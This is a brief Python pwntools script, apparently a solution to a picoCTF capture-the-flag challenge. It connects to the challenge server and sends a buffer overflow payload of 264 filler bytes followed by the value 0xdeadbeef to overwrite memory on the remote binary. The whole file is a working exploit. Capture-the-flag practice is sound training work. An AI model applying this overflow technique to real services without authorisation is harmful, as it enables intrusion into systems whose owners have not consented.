from pwn import *

#p = process("./chall")
p=remote("mars.picoctf.net",31890)
payload = b"a"*264
payload += p64(0xdeadbeef)
p.recv()
p.sendline(payload)
print(p.recv())
p.close()
